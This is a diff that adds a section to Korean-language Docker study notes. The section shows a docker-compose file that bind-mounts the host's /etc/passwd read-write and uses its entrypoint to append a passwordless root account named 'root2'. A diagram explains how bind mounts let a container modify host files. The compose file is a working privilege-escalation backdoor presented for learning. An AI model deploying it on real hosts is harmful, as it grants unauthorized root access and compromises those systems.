@@ -74,6 +74,49 @@ docker compose ps
 docker compose exec -it <service_name> bash
 ```
 ---
+## docker-compose.yaml
+```yaml
+version: "3.8"
+
+services:
+  suidbash:
+    image: ubuntu:latest
+    container_name: suid_bash_container
+    volumes:
+      - /etc/passwd:/mnt/passwd:rw
+    entrypoint: ["/bin/bash", "-c", "echo 'root2::0:0::/root:/bin/bash' >> /mnt/passwd && tail -f /dev/null"]
+    tty: true
+```
+
+**핵심 동작:**
+
+| 설정 항목 | 역할 |
+|-----------|------|
+| `volumes` | 호스트의 `/etc/passwd`를 컨테이너 내부에 읽기/쓰기로 마운트 |
+| `entrypoint` | 컨테이너 시작 시 패스워드 없는 root 계정(`root2`) 추가 |
+| `tty: true` | 컨테이너가 종료되지 않고 유지되도록 설정 |
+
+## 왜 컨테이너 안에서 수정했는데 호스트가 변조되는가?
+
+```yaml
+volumes:
+  - /etc/passwd:/mnt/passwd:rw
+```
+
+이 설정은 **파일을 복사하는 것이 아니라 연결**
+
+```
+호스트 파일시스템               컨테이너 파일시스템
+
+  /etc/passwd    ←─────────→   /mnt/passwd
+       ↑             동일한          ↑
+    실제 파일          파일!       그냥 별명
+```
+
+- 호스트의 `/etc/passwd`와 컨테이너의 `/mnt/passwd`는 **같은 파일을 서로 다른 경로로 바라보는 것**
+- 따라서 컨테이너 안에서 `/mnt/passwd`를 수정하면 → **호스트의 `/etc/passwd`가 직접 수정됨**
+
+---
 ## 네트워크 참고
 
 - Docker 브리지 네트워크는 주로 `172.17.0.0/16` ~ `172.31.0.0/16` 대역을 사용한다.
